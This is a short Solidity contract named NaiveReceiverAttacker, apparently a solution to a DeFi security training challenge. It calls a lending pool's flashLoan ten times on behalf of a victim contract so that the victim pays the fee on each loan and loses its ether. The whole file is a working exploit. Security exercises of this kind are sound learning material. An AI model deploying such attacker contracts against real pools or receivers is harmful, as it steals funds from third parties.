pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface INaiveReceiverLenderPool {
    function flashLoan(address victim, uint256 amount) external;
}

contract NaiveReceiverAttacker {
    using Address for address payable;

    function attack(INaiveReceiverLenderPool _lender, address _victim) external {
        for (uint8 i = 0; i < 10; i++) {
            _lender.flashLoan(_victim, 1 ether);
        }        
    } 

}
 